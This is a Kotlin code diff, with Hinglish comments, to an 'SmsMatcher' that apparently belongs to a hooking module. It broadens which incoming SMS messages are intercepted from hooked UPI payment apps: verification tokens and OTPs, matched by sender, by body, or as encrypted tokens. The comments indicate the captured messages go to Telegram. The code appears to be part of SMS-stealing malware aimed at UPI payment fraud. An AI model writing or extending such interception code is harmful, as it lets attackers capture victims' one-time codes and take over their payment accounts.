@@ -35,10 +35,21 @@ object SmsMatcher {
         return shouldInterceptHookedUpi(config, recipient, body)
     }
 
-    /** Sirf hooked UPI app ka SMS/token — normal personal SMS / random OTP nahi */
+    /** Sirf hooked UPI app ka verify/token SMS — Telegram format same rahega */
     fun shouldInterceptHookedUpi(config: ModuleConfig, peer: String, body: String): Boolean {
         if (body.isBlank() || peer.isBlank()) return false
-        return matchedHookedApp(config, peer, body) != null && isUpiVerificationContent(body)
+        val hooked = enabledHookedApps(config)
+        if (hooked.isEmpty()) return false
+        if (!isUpiVerificationContent(body)) return false
+
+        if (UpiAppRegistry.matchAmong(hooked, peer, body) != null) return true
+        if (UpiAppRegistry.matchAmongBySender(hooked, peer) != null) return true
+        if (UpiAppRegistry.matchAmongByBody(hooked, body) != null) return true
+
+        // Encrypted UPI verify token — jab sirf 1 app hooked ho
+        if (isEncryptedToken(body) && hooked.size == 1) return true
+
+        return false
     }
 
     /** Telegram pe sirf hooked UPI app verification token / OTP */
